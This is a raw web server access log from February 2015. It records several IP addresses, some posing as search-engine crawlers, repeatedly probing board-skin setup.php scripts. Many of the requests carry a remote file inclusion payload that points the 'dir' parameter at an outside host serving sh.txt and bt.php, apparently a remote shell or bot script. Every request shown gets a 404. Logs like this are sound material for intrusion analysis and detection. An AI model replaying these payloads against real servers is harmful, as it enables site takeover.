112.218.68.155 - - [21/Feb/2015:16:30:15 -0800] "POST ////bbs/skin/ggambo6000_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/4.40 (compatible; MSI4E 6.0; Windows NT 5.1; SV1; .NET CLR 1.0.3705; .NET CLR 1.1.4322; Media Center PC 4.0; .NET CLR 2.0.50727)" 
112.218.68.155 - - [21/Feb/2015:16:30:15 -0800] "POST ////bbs/skin/ggambo6001_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/4.40 (compatible; MSI4E 6.0; Windows NT 5.1; SV1; .NET CLR 1.0.3705; .NET CLR 1.1.4322; Media Center PC 4.0; .NET CLR 2.0.50727)" 
112.218.68.155 - - [21/Feb/2015:16:30:16 -0800] "POST ////bbs/skin/ggambo6000_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/4.40 (compatible; MSI4E 6.0; Windows NT 5.1; SV1; .NET CLR 1.0.3705; .NET CLR 1.1.4322; Media Center PC 4.0; .NET CLR 2.0.50727)" 
178.33.226.103 - - [21/Feb/2015:16:30:16 -0800] "GET ////bbs/skin/ggambo6001_board/setup.php?dir=http://www.se-kwang.co.kr/mods//sh.txt? HTTP/1.1" 404 284 "-" "Microsoft Pocket Internet Explorer/0.6" 
112.218.68.155 - - [21/Feb/2015:16:30:16 -0800] "POST ////bbs/skin/ggambo6001_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/4.40 (compatible; MSI4E 6.0; Windows NT 5.1; SV1; .NET CLR 1.0.3705; .NET CLR 1.1.4322; Media Center PC 4.0; .NET CLR 2.0.50727)" 
211.47.181.38 - - [21/Feb/2015:16:30:17 -0800] "GET ////bbs/skin/ggambo6001_board/setup.php?dir=http://www.se-kwang.co.kr/mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (compatible;Baiduspider/2.0;+http://www.baidu.com/search/spider.html)" 
178.33.226.103 - - [21/Feb/2015:16:30:17 -0800] "GET ////bbs/skin/ggambo6001_board/setup.php?dir=http://www.se-kwang.co.kr/mods//bt.php? HTTP/1.1" 404 284 "-" "Microsoft Pocket Internet Explorer/0.6" 
178.33.226.103 - - [21/Feb/2015:16:30:18 -0800] "POST ////bbs/skin/ggambo6001_board/setup.php HTTP/1.1" 404 284 "-" "Microsoft Pocket Internet Explorer/0.6" 
178.33.226.103 - - [21/Feb/2015:16:30:19 -0800] "POST ////bbs/skin/ggambo6001_board/setup.php HTTP/1.1" 404 284 "-" "Microsoft Pocket Internet Explorer/0.6" 
211.47.181.38 - - [21/Feb/2015:16:30:19 -0800] "GET ////bbs/skin/ggambo6001_board/setup.php?dir=http://www.se-kwang.co.kr/mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (compatible;Baiduspider/2.0;+http://www.baidu.com/search/spider.html)" 
211.47.181.38 - - [21/Feb/2015:16:30:19 -0800] "POST ////bbs/skin/ggambo6001_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (compatible;Baiduspider/2.0;+http://www.baidu.com/search/spider.html)" 
211.47.181.38 - - [21/Feb/2015:16:30:20 -0800] "GET ////bbs/skin/ggambo6001_board/setup.php?dir=http://www.se-kwang.co.kr/mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/4.7C-CCK-MCD {C-UDP; EBM-APPLE} (Macintosh; I; PPC)" 
112.218.68.155 - - [21/Feb/2015:16:30:20 -0800] "GET ////bbs/skin/ggambo6001_board/setup.php?dir=http://www.se-kwang.co.kr/mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.7.12) Gecko/20050915 Firefox/1.0.7" 
211.47.181.38 - - [21/Feb/2015:16:30:21 -0800] "POST ////bbs/skin/ggambo6001_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (compatible;Baiduspider/2.0;+http://www.baidu.com/search/spider.html)" 
211.47.181.38 - - [21/Feb/2015:16:30:21 -0800] "GET ////bbs/skin/ggambo6001_board/setup.php?dir=http://www.se-kwang.co.kr/mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/4.7C-CCK-MCD {C-UDP; EBM-APPLE} (Macintosh; I; PPC)" 
211.47.181.38 - - [21/Feb/2015:16:30:22 -0800] "POST ////bbs/skin/ggambo6001_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/4.7C-CCK-MCD {C-UDP; EBM-APPLE} (Macintosh; I; PPC)" 
112.218.68.155 - - [21/Feb/2015:16:30:22 -0800] "GET ////bbs/skin/ggambo6001_board/setup.php?dir=http://www.se-kwang.co.kr/mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.7.12) Gecko/20050915 Firefox/1.0.7" 
211.47.181.38 - - [21/Feb/2015:16:30:23 -0800] "POST ////bbs/skin/ggambo6001_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/4.7C-CCK-MCD {C-UDP; EBM-APPLE} (Macintosh; I; PPC)" 
112.218.68.155 - - [21/Feb/2015:16:30:23 -0800] "POST ////bbs/skin/ggambo6001_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.7.12) Gecko/20050915 Firefox/1.0.7" 
112.218.68.155 - - [21/Feb/2015:16:30:25 -0800] "POST ////bbs/skin/ggambo6001_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.7.12) Gecko/20050915 Firefox/1.0.7" 
211.47.181.38 - - [21/Feb/2015:16:30:26 -0800] "GET ////bbs/skin/ggambo6000_board/setup.php?dir=http://www.se-kwang.co.kr/mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (compatible;Baiduspider/2.0;+http://www.baidu.com/search/spider.html)" 
198.50.146.246 - - [21/Feb/2015:16:30:26 -0800] "GET ////bbs/skin/ggambo6000_board/setup.php?dir=http://www.se-kwang.co.kr/mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/2.0 (compatible; MSIE 3.01; Windows 98)" 
198.50.146.246 - - [21/Feb/2015:16:30:26 -0800] "GET ////bbs/skin/ggambo6001_board/setup.php?dir=http://www.se-kwang.co.kr/mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/2.0 (compatible; MSIE 3.01; Windows 98)" 
211.47.181.38 - - [21/Feb/2015:16:30:27 -0800] "GET ////bbs/skin/ggambo6000_board/setup.php?dir=http://www.se-kwang.co.kr/mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (compatible;Baiduspider/2.0;+http://www.baidu.com/search/spider.html)" 
198.50.146.246 - - [21/Feb/2015:16:30:27 -0800] "GET ////bbs/skin/ggambo6000_board/setup.php?dir=http://www.se-kwang.co.kr/mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/2.0 (compatible; MSIE 3.01; Windows 98)" 
198.50.146.246 - - [21/Feb/2015:16:30:28 -0800] "GET ////bbs/skin/ggambo6001_board/setup.php?dir=http://www.se-kwang.co.kr/mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/2.0 (compatible; MSIE 3.01; Windows 98)" 
198.50.146.246 - - [21/Feb/2015:16:30:28 -0800] "POST ////bbs/skin/ggambo6001_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/2.0 (compatible; MSIE 3.01; Windows 98)" 
198.50.146.246 - - [21/Feb/2015:16:30:28 -0800] "POST ////bbs/skin/ggambo6000_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/2.0 (compatible; MSIE 3.01; Windows 98)" 
211.47.181.38 - - [21/Feb/2015:16:30:28 -0800] "POST ////bbs/skin/ggambo6000_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (compatible;Baiduspider/2.0;+http://www.baidu.com/search/spider.html)" 
198.50.146.246 - - [21/Feb/2015:16:30:29 -0800] "POST ////bbs/skin/ggambo6001_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/2.0 (compatible; MSIE 3.01; Windows 98)" 
198.50.146.246 - - [21/Feb/2015:16:30:29 -0800] "POST ////bbs/skin/ggambo6000_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/2.0 (compatible; MSIE 3.01; Windows 98)" 
211.47.181.38 - - [21/Feb/2015:16:30:29 -0800] "GET ////bbs/skin/ggambo6000_board/setup.php?dir=http://www.se-kwang.co.kr/mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/4.7C-CCK-MCD {C-UDP; EBM-APPLE} (Macintosh; I; PPC)" 
211.47.181.38 - - [21/Feb/2015:16:30:30 -0800] "GET ////bbs/skin/ggambo6000_board/setup.php?dir=http://www.se-kwang.co.kr/mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/4.7C-CCK-MCD {C-UDP; EBM-APPLE} (Macintosh; I; PPC)" 
211.47.181.38 - - [21/Feb/2015:16:30:30 -0800] "POST ////bbs/skin/ggambo6000_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (compatible;Baiduspider/2.0;+http://www.baidu.com/search/spider.html)" 
211.47.181.38 - - [21/Feb/2015:16:30:31 -0800] "POST ////bbs/skin/ggambo6000_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/4.7C-CCK-MCD {C-UDP; EBM-APPLE} (Macintosh; I; PPC)" 
211.47.181.38 - - [21/Feb/2015:16:30:32 -0800] "POST ////bbs/skin/ggambo6000_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/4.7C-CCK-MCD {C-UDP; EBM-APPLE} (Macintosh; I; PPC)" 
176.31.252.38 - - [21/Feb/2015:16:31:25 -0800] "GET ////bbs/skin/ggambo6000_board/setup.php?dir= HTTP/1.1" 404 284 "-" "Mozilla/1.22 (compatible; MSIE 2.0; Windows 95)" 
176.31.252.38 - - [21/Feb/2015:16:31:26 -0800] "GET ////bbs/skin/ggambo6001_board/setup.php?dir= HTTP/1.1" 404 284 "-" "Mozilla/1.22 (compatible; MSIE 2.0; Windows 95)" 
176.31.252.38 - - [21/Feb/2015:16:31:26 -0800] "GET ////bbs/skin/ggambo6000_board/setup.php?dir=http://www.se-kwang.co.kr/mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/1.22 (compatible; MSIE 2.0; Windows 95)" 
176.31.252.38 - - [21/Feb/2015:16:31:27 -0800] "POST ////bbs/skin/ggambo6000_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/1.22 (compatible; MSIE 2.0; Windows 95)" 
176.31.252.38 - - [21/Feb/2015:16:31:27 -0800] "GET ////bbs/skin/ggambo6001_board/setup.php?dir=http://www.se-kwang.co.kr/mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (X11; U; FreeBSD i386; en-US; rv:1.7.8) Gecko/20050609 Firefox/1.0.4" 
176.31.252.38 - - [21/Feb/2015:16:31:27 -0800] "GET ////bbs/skin/ggambo6001_board/setup.php?dir=http://www.se-kwang.co.kr/mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/1.22 (compatible; MSIE 2.0; Windows 95)" 
176.31.252.38 - - [21/Feb/2015:16:31:27 -0800] "POST ////bbs/skin/ggambo6001_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/1.22 (compatible; MSIE 2.0; Windows 95)" 
176.31.252.38 - - [21/Feb/2015:16:31:28 -0800] "POST ////bbs/skin/ggambo6000_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/1.22 (compatible; MSIE 2.0; Windows 95)" 
176.31.252.38 - - [21/Feb/2015:16:31:28 -0800] "GET ////bbs/skin/ggambo6001_board/setup.php?dir=http://www.se-kwang.co.kr/mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (X11; U; FreeBSD i386; en-US; rv:1.7.8) Gecko/20050609 Firefox/1.0.4" 
176.31.252.38 - - [21/Feb/2015:16:31:28 -0800] "POST ////bbs/skin/ggambo6001_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (X11; U; FreeBSD i386; en-US; rv:1.7.8) Gecko/20050609 Firefox/1.0.4" 
176.31.252.38 - - [21/Feb/2015:16:31:28 -0800] "GET ////bbs/skin/ggambo6000_board/setup.php?dir=http://www.se-kwang.co.kr/mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (X11; U; FreeBSD i386; en-US; rv:1.7.8) Gecko/20050609 Firefox/1.0.4" 
176.31.252.38 - - [21/Feb/2015:16:31:28 -0800] "POST ////bbs/skin/ggambo6001_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/1.22 (compatible; MSIE 2.0; Windows 95)" 
176.31.252.38 - - [21/Feb/2015:16:31:28 -0800] "GET ////bbs/skin/ggambo6001_board/setup.php?dir=http://www.se-kwang.co.kr/mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows;U;Windows NT 5.1; l-PL;rv:1.8.1.24pre) Gecko/20100228 K-Meleon/1.5.4" 
176.31.252.38 - - [21/Feb/2015:16:31:29 -0800] "POST ////bbs/skin/ggambo6001_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (X11; U; FreeBSD i386; en-US; rv:1.7.8) Gecko/20050609 Firefox/1.0.4" 
176.31.252.38 - - [21/Feb/2015:16:31:29 -0800] "GET ////bbs/skin/ggambo6000_board/setup.php?dir=http://www.se-kwang.co.kr/mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (X11; U; FreeBSD i386; en-US; rv:1.7.8) Gecko/20050609 Firefox/1.0.4" 
176.31.252.38 - - [21/Feb/2015:16:31:30 -0800] "POST ////bbs/skin/ggambo6000_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (X11; U; FreeBSD i386; en-US; rv:1.7.8) Gecko/20050609 Firefox/1.0.4" 
176.31.252.38 - - [21/Feb/2015:16:31:30 -0800] "GET ////bbs/skin/ggambo6001_board/setup.php?dir=http://www.se-kwang.co.kr/mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows;U;Windows NT 5.1; l-PL;rv:1.8.1.24pre) Gecko/20100228 K-Meleon/1.5.4" 
176.31.252.38 - - [21/Feb/2015:16:31:30 -0800] "POST ////bbs/skin/ggambo6001_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows;U;Windows NT 5.1; l-PL;rv:1.8.1.24pre) Gecko/20100228 K-Meleon/1.5.4" 
176.31.252.38 - - [21/Feb/2015:16:31:31 -0800] "POST ////bbs/skin/ggambo6000_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (X11; U; FreeBSD i386; en-US; rv:1.7.8) Gecko/20050609 Firefox/1.0.4" 
176.31.252.38 - - [21/Feb/2015:16:31:31 -0800] "POST ////bbs/skin/ggambo6001_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows;U;Windows NT 5.1; l-PL;rv:1.8.1.24pre) Gecko/20100228 K-Meleon/1.5.4" 
176.31.252.38 - - [21/Feb/2015:16:31:37 -0800] "GET ////bbs/skin/ggambo6001_board/setup.php?dir=http://www.se-kwang.co.kr/mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (BeOS; U; BeOS BePC; en-US; rv:1.9a1) Gecko/20051002 Firefox/1.6a1" 
176.31.252.38 - - [21/Feb/2015:16:31:38 -0800] "GET ////bbs/skin/ggambo6001_board/setup.php?dir=http://www.se-kwang.co.kr/mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (compatible; Yahoo! Slurp; http://help.yahoo.com/help/us/ysearch/slurp)" 
176.31.252.38 - - [21/Feb/2015:16:31:38 -0800] "GET ////bbs/skin/ggambo6001_board/setup.php?dir=http://www.se-kwang.co.kr/mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (BeOS; U; BeOS BePC; en-US; rv:1.9a1) Gecko/20051002 Firefox/1.6a1" 
176.31.252.38 - - [21/Feb/2015:16:31:38 -0800] "POST ////bbs/skin/ggambo6001_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (BeOS; U; BeOS BePC; en-US; rv:1.9a1) Gecko/20051002 Firefox/1.6a1" 
176.31.252.38 - - [21/Feb/2015:16:31:39 -0800] "GET ////bbs/skin/ggambo6001_board/setup.php?dir=http://www.se-kwang.co.kr/mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (compatible; Yahoo! Slurp; http://help.yahoo.com/help/us/ysearch/slurp)" 
176.31.252.38 - - [21/Feb/2015:16:31:39 -0800] "POST ////bbs/skin/ggambo6001_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (compatible; Yahoo! Slurp; http://help.yahoo.com/help/us/ysearch/slurp)" 
176.31.252.38 - - [21/Feb/2015:16:31:40 -0800] "POST ////bbs/skin/ggambo6001_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (BeOS; U; BeOS BePC; en-US; rv:1.9a1) Gecko/20051002 Firefox/1.6a1" 
176.31.252.38 - - [21/Feb/2015:16:31:40 -0800] "POST ////bbs/skin/ggambo6001_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (compatible; Yahoo! Slurp; http://help.yahoo.com/help/us/ysearch/slurp)" 
112.218.68.155 - - [21/Feb/2015:16:32:48 -0800] "GET ////bbs/skin/ggambo6000_board/setup.php?dir=http://www.se-kwang.co.kr/mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/4.40 (compatible; MSI4E 6.0; Windows NT 5.1; SV1; .NET CLR 1.0.3705; .NET CLR 1.1.4322; Media Center PC 4.0; .NET CLR 2.0.50727)" 
211.47.181.38 - - [21/Feb/2015:16:32:49 -0800] "GET ////bbs/skin/ggambo6000_board/setup.php?dir=http://www.se-kwang.co.kr/mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (compatible;Baiduspider/2.0;+http://www.baidu.com/search/spider.html)" 
112.218.68.155 - - [21/Feb/2015:16:32:49 -0800] "GET ////bbs/skin/ggambo6000_board/setup.php?dir=http://www.se-kwang.co.kr/mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/4.40 (compatible; MSI4E 6.0; Windows NT 5.1; SV1; .NET CLR 1.0.3705; .NET CLR 1.1.4322; Media Center PC 4.0; .NET CLR 2.0.50727)" 
112.218.68.155 - - [21/Feb/2015:16:32:50 -0800] "POST ////bbs/skin/ggambo6000_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/4.40 (compatible; MSI4E 6.0; Windows NT 5.1; SV1; .NET CLR 1.0.3705; .NET CLR 1.1.4322; Media Center PC 4.0; .NET CLR 2.0.50727)" 
211.47.181.38 - - [21/Feb/2015:16:32:50 -0800] "GET ////bbs/skin/ggambo6000_board/setup.php?dir=http://www.se-kwang.co.kr/mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (compatible;Baiduspider/2.0;+http://www.baidu.com/search/spider.html)" 
211.47.181.38 - - [21/Feb/2015:16:32:51 -0800] "POST ////bbs/skin/ggambo6000_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (compatible;Baiduspider/2.0;+http://www.baidu.com/search/spider.html)" 
112.218.68.155 - - [21/Feb/2015:16:32:51 -0800] "POST ////bbs/skin/ggambo6000_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/4.40 (compatible; MSI4E 6.0; Windows NT 5.1; SV1; .NET CLR 1.0.3705; .NET CLR 1.1.4322; Media Center PC 4.0; .NET CLR 2.0.50727)" 
211.47.181.38 - - [21/Feb/2015:16:32:52 -0800] "POST ////bbs/skin/ggambo6000_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (compatible;Baiduspider/2.0;+http://www.baidu.com/search/spider.html)" 
211.47.181.38 - - [21/Feb/2015:16:32:59 -0800] "GET ////bbs/skin/ggambo6001_board/setup.php?dir=http://www.se-kwang.co.kr/mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (compatible;Baiduspider/2.0;+http://www.baidu.com/search/spider.html)" 
211.47.181.38 - - [21/Feb/2015:16:33:00 -0800] "GET ////bbs/skin/ggambo6001_board/setup.php?dir=http://www.se-kwang.co.kr/mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (compatible;Baiduspider/2.0;+http://www.baidu.com/search/spider.html)" 
211.47.181.38 - - [21/Feb/2015:16:33:01 -0800] "POST ////bbs/skin/ggambo6001_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (compatible;Baiduspider/2.0;+http://www.baidu.com/search/spider.html)" 
211.47.181.38 - - [21/Feb/2015:16:33:02 -0800] "POST ////bbs/skin/ggambo6001_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (compatible;Baiduspider/2.0;+http://www.baidu.com/search/spider.html)" 
112.218.68.155 - - [21/Feb/2015:16:33:05 -0800] "GET ////bbs/skin/ggambo6001_board/setup.php?dir=http://www.se-kwang.co.kr/mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/4.40 (compatible; MSI4E 6.0; Windows NT 5.1; SV1; .NET CLR 1.0.3705; .NET CLR 1.1.4322; Media Center PC 4.0; .NET CLR 2.0.50727)" 
112.218.68.155 - - [21/Feb/2015:16:33:07 -0800] "GET ////bbs/skin/ggambo6001_board/setup.php?dir=http://www.se-kwang.co.kr/mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/4.40 (compatible; MSI4E 6.0; Windows NT 5.1; SV1; .NET CLR 1.0.3705; .NET CLR 1.1.4322; Media Center PC 4.0; .NET CLR 2.0.50727)" 
112.218.68.155 - - [21/Feb/2015:16:33:07 -0800] "POST ////bbs/skin/ggambo6001_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/4.40 (compatible; MSI4E 6.0; Windows NT 5.1; SV1; .NET CLR 1.0.3705; .NET CLR 1.1.4322; Media Center PC 4.0; .NET CLR 2.0.50727)" 
112.218.68.155 - - [21/Feb/2015:16:33:09 -0800] "POST ////bbs/skin/ggambo6001_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/4.40 (compatible; MSI4E 6.0; Windows NT 5.1; SV1; .NET CLR 1.0.3705; .NET CLR 1.1.4322; Media Center PC 4.0; .NET CLR 2.0.50727)" 
112.218.68.155 - - [21/Feb/2015:16:33:13 -0800] "GET ////bbs/skin/ggambo6000_board/setup.php?dir=http://www.se-kwang.co.kr/mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/4.40 (compatible; MSI4E 6.0; Windows NT 5.1; SV1; .NET CLR 1.0.3705; .NET CLR 1.1.4322; Media Center PC 4.0; .NET CLR 2.0.50727)" 
112.218.68.155 - - [21/Feb/2015:16:33:17 -0800] "GET ////bbs/skin/ggambo6000_board/setup.php?dir=http://www.se-kwang.co.kr/mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/4.40 (compatible; MSI4E 6.0; Windows NT 5.1; SV1; .NET CLR 1.0.3705; .NET CLR 1.1.4322; Media Center PC 4.0; .NET CLR 2.0.50727)" 
112.218.68.155 - - [21/Feb/2015:16:33:18 -0800] "POST ////bbs/skin/ggambo6000_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/4.40 (compatible; MSI4E 6.0; Windows NT 5.1; SV1; .NET CLR 1.0.3705; .NET CLR 1.1.4322; Media Center PC 4.0; .NET CLR 2.0.50727)" 
112.218.68.155 - - [21/Feb/2015:16:33:19 -0800] "POST ////bbs/skin/ggambo6000_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/4.40 (compatible; MSI4E 6.0; Windows NT 5.1; SV1; .NET CLR 1.0.3705; .NET CLR 1.1.4322; Media Center PC 4.0; .NET CLR 2.0.50727)" 
112.218.68.155 - - [21/Feb/2015:16:33:23 -0800] "GET ////bbs/skin/ggambo6001_board/setup.php?dir=http://www.se-kwang.co.kr/mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/4.40 (compatible; MSI4E 6.0; Windows NT 5.1; SV1; .NET CLR 1.0.3705; .NET CLR 1.1.4322; Media Center PC 4.0; .NET CLR 2.0.50727)" 
112.218.68.155 - - [21/Feb/2015:16:33:24 -0800] "GET ////bbs/skin/ggambo6001_board/setup.php?dir=http://www.se-kwang.co.kr/mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/4.40 (compatible; MSI4E 6.0; Windows NT 5.1; SV1; .NET CLR 1.0.3705; .NET CLR 1.1.4322; Media Center PC 4.0; .NET CLR 2.0.50727)" 
112.218.68.155 - - [21/Feb/2015:16:33:25 -0800] "POST ////bbs/skin/ggambo6001_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/4.40 (compatible; MSI4E 6.0; Windows NT 5.1; SV1; .NET CLR 1.0.3705; .NET CLR 1.1.4322; Media Center PC 4.0; .NET CLR 2.0.50727)" 
112.218.68.155 - - [21/Feb/2015:16:33:26 -0800] "POST ////bbs/skin/ggambo6001_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/4.40 (compatible; MSI4E 6.0; Windows NT 5.1; SV1; .NET CLR 1.0.3705; .NET CLR 1.1.4322; Media Center PC 4.0; .NET CLR 2.0.50727)" 
114.202.2.31 - - [21/Feb/2015:16:33:29 -0800] "GET ////bbs/skin/ggambo6001_board/setup.php?dir=http://www.se-kwang.co.kr/mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.7.6) Gecko/20050512 Firefox" 
114.202.2.31 - - [21/Feb/2015:16:33:31 -0800] "GET ////bbs/skin/ggambo6001_board/setup.php?dir=http://www.se-kwang.co.kr/mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.7.6) Gecko/20050512 Firefox" 
114.202.2.31 - - [21/Feb/2015:16:33:32 -0800] "POST ////bbs/skin/ggambo6001_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.7.6) Gecko/20050512 Firefox" 
114.202.2.31 - - [21/Feb/2015:16:33:33 -0800] "POST ////bbs/skin/ggambo6001_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.7.6) Gecko/20050512 Firefox" 
198.50.146.246 - - [21/Feb/2015:16:35:40 -0800] "GET ////bbs/skin/ggambo6000_board/setup.php?dir=http://www.se-kwang.co.kr/mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 6.0; America Online Browser 1.1; rev1.2; Windows NT 5.1;)" 
198.50.146.246 - - [21/Feb/2015:16:35:41 -0800] "GET ////bbs/skin/ggambo6000_board/setup.php?dir=http://www.se-kwang.co.kr/mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 6.0; America Online Browser 1.1; rev1.2; Windows NT 5.1;)" 
198.50.146.246 - - [21/Feb/2015:16:35:41 -0800] "POST ////bbs/skin/ggambo6000_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 6.0; America Online Browser 1.1; rev1.2; Windows NT 5.1;)" 
198.50.146.246 - - [21/Feb/2015:16:35:42 -0800] "GET ////bbs/skin/ggambo6001_board/setup.php?dir=http://www.se-kwang.co.kr/mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 6.0; America Online Browser 1.1; rev1.2; Windows NT 5.1;)" 
198.50.146.246 - - [21/Feb/2015:16:35:42 -0800] "POST ////bbs/skin/ggambo6000_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 6.0; America Online Browser 1.1; rev1.2; Windows NT 5.1;)" 
198.50.146.246 - - [21/Feb/2015:16:35:43 -0800] "GET ////bbs/skin/ggambo6001_board/setup.php?dir=http://www.se-kwang.co.kr/mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 6.0; America Online Browser 1.1; rev1.2; Windows NT 5.1;)" 
198.50.146.246 - - [21/Feb/2015:16:35:43 -0800] "POST ////bbs/skin/ggambo6001_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 6.0; America Online Browser 1.1; rev1.2; Windows NT 5.1;)" 
198.50.146.246 - - [21/Feb/2015:16:35:44 -0800] "POST ////bbs/skin/ggambo6001_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 6.0; America Online Browser 1.1; rev1.2; Windows NT 5.1;)" 
176.31.252.38 - - [21/Feb/2015:16:35:51 -0800] "GET ////bbs/skin/ggambo6001_board/setup.php?dir=http://www.se-kwang.co.kr/mods//sh.txt? HTTP/1.1" 404 284 "-" "msnbot/1.1 (+http://search.msn.com/msnbot.htm)" 
176.31.252.38 - - [21/Feb/2015:16:35:52 -0800] "GET ////bbs/skin/ggambo6001_board/setup.php?dir=http://www.se-kwang.co.kr/mods//bt.php? HTTP/1.1" 404 284 "-" "msnbot/1.1 (+http://search.msn.com/msnbot.htm)" 
176.31.252.38 - - [21/Feb/2015:16:35:52 -0800] "POST ////bbs/skin/ggambo6001_board/setup.php HTTP/1.1" 404 284 "-" "msnbot/1.1 (+http://search.msn.com/msnbot.htm)" 
176.31.252.38 - - [21/Feb/2015:16:35:53 -0800] "POST ////bbs/skin/ggambo6001_board/setup.php HTTP/1.1" 404 284 "-" "msnbot/1.1 (+http://search.msn.com/msnbot.htm)" 
112.218.68.155 - - [21/Feb/2015:16:36:10 -0800] "GET ////bbs/skin/ggambo6000_board/setup.php?dir=http://www.se-kwang.co.kr/mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Macintosh; U; PPC Mac OS X Mach-O; en-US; rv:1.7.12) Gecko/20050915 Firefox/1.0.7" 
